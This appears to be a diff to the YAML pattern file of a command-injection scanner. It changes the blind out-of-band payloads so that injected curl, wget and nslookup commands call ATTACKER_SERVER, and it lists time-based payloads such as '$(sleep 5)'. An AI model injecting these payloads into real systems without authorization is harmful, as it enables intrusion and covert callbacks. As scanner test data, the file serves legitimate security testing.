@@ -50,9 +50,9 @@ patterns:
       - "$(sleep 5)"
       - "& timeout /t 5 /nobreak"
     blind_oob:
-      - "; curl http://{oob}/cmdi"
-      - "| wget http://{oob}/cmdi"
-      - "; nslookup {oob}"
+      - "; curl http://ATTACKER_SERVER/cmdi"
+      - "| wget http://ATTACKER_SERVER/cmdi"
+      - "; nslookup ATTACKER_SERVER"
 
   test_locations:
     - url_parameters
